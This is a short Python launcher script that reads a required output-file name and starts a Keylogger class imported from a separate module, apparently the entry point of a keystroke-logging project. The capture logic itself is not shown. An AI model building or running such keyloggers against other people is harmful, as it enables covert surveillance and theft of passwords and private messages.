import argparse
from src.keylogger import Keylogger


#argument support
parser = argparse.ArgumentParser()
parser.add_argument("-o","--output",required=True,help="Name of the output file")
args = vars(parser.parse_args())


if __name__ == '__main__':
  keylogger = Keylogger(args["output"])
  keylogger.start()
